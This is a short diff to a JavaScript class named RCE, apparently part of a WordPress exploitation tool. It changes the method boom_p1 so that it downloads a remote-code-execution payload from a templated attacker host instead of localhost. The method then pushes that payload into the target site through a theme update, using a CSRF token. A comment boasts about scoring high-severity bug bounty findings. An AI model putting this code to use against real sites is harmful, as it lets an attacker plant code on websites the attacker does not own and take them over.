@@ -39,7 +39,7 @@ class RCE {
 	boom_p1(csrf){
 		/*This function will get your P1. You can now go over Twitter and BOOM P1 everyone*/
 		var that = this;
-		var payload = that.get_req('http://127.0.0.1/wordpress_rce.txt');
+		var payload = that.get_req('http://{{ATTACKER}}/wordpress_rce.txt');
 		that.theme_update(payload, csrf);
 
 	}
